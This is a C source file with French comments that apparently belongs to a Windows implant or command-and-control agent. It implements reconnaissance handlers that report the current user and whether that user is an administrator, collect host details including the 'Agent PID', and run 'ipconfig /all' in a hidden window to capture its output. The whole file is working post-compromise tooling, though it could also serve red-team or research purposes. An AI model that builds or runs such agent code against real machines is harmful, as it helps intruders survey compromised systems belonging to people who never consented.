/*
 * recon.c - Collecte d'informations système
 */

#include "recon.h"
#include "../../utils/memory.h"
#include "../../utils/strings.h"

/* Pour RtlGetVersion */
typedef LONG(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);

int handler_recon_whoami(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char username[256] = {0};
  char domain[256] = {0};
  DWORD size;

  /* Récupère le nom d'utilisateur */
  size = sizeof(username);
  GetUserNameA(username, &size);

  /* Récupère le domaine via variable d'environnement */
  char *env_domain = getenv("USERDOMAIN");
  if (env_domain) {
    strncpy(domain, env_domain, sizeof(domain) - 1);
  }

  /* Check si admin */
  BOOL is_admin = FALSE;
  PSID admin_group = NULL;
  SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;

  if (AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                               DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                               &admin_group)) {
    CheckTokenMembership(NULL, admin_group, &is_admin);
    FreeSid(admin_group);
  }

  /* Construit le résultat */
  char *buffer = (char *)malloc(512);
  if (!buffer) {
    return STATUS_NO_MEMORY;
  }

  snprintf(buffer, 512, "%s\\%s%s", domain, username,
           is_admin ? " (Administrator)" : "");

  *output = buffer;
  *len = strlen(buffer);

  return STATUS_SUCCESS;
}

int handler_recon_sysinfo(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  char hostname[256] = {0};
  char username[256] = {0};
  char domain[256] = {0};
  DWORD size;

  /* Hostname */
  size = sizeof(hostname);
  GetComputerNameA(hostname, &size);

  /* Username */
  size = sizeof(username);
  GetUserNameA(username, &size);

  /* Domain */
  char *env_domain = getenv("USERDOMAIN");
  if (env_domain) {
    strncpy(domain, env_domain, sizeof(domain) - 1);
  }

  /* OS version via RtlGetVersion (évite les problèmes de compat) */
  char os_version[128] = "Windows (unknown version)";
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  if (ntdll) {
    RtlGetVersionPtr rtl_get_version =
        (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (rtl_get_version) {
      RTL_OSVERSIONINFOW vi = {0};
      vi.dwOSVersionInfoSize = sizeof(vi);
      if (rtl_get_version(&vi) == 0) {
        snprintf(os_version, sizeof(os_version), "Windows %lu.%lu Build %lu",
                 vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
      }
    }
  }

  /* Architecture */
  SYSTEM_INFO si;
  GetNativeSystemInfo(&si);
  const char *arch = "x86";
  if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
    arch = "x64";
  } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
    arch = "ARM64";
  }

  /* RAM */
  MEMORYSTATUSEX mem = {0};
  mem.dwLength = sizeof(mem);
  GlobalMemoryStatusEx(&mem);
  DWORD ram_mb = (DWORD)(mem.ullTotalPhys / (1024 * 1024));

  /* CPU count */
  DWORD cpu_count = si.dwNumberOfProcessors;

  /* PID */
  DWORD pid = GetCurrentProcessId();

  /* Construit le résultat */
  char *buffer = (char *)malloc(2048);
  if (!buffer) {
    return STATUS_NO_MEMORY;
  }

  snprintf(buffer, 2048,
           "Hostname:     %s\n"
           "Username:     %s\\%s\n"
           "OS:           %s\n"
           "Architecture: %s\n"
           "CPUs:         %lu\n"
           "RAM:          %lu MB\n"
           "Agent PID:    %lu\n",
           hostname, domain, username, os_version, arch, cpu_count, ram_mb,
           pid);

  *output = buffer;
  *len = strlen(buffer);

  return STATUS_SUCCESS;
}

int handler_recon_ipconfig(char **output, size_t *len) {
  if (!output || !len) {
    return STATUS_FAILURE;
  }

  // exec ipconfig et capture output
  HANDLE hReadPipe, hWritePipe;
  SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
  
  if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    return STATUS_FAILURE;
  }
  
  STARTUPINFOA si = {0};
  PROCESS_INFORMATION pi = {0};
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;
  si.wShowWindow = SW_HIDE;
  
  char cmd[] = "ipconfig /all";
  if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    return STATUS_FAILURE;
  }
  
  CloseHandle(hWritePipe);
  
  // lire la sortie
  char *buffer = (char*)malloc(8192);
  if (!buffer) {
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return STATUS_NO_MEMORY;
  }
  
  DWORD total = 0, bytes_read;
  while (ReadFile(hReadPipe, buffer + total, 8192 - total - 1, &bytes_read, NULL) && bytes_read > 0) {
    total += bytes_read;
    if (total >= 8191) break;
  }
  buffer[total] = '\0';
  
  CloseHandle(hReadPipe);
  WaitForSingleObject(pi.hProcess, 3000);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  
  *output = buffer;
  *len = total;
  
  return STATUS_SUCCESS;
}
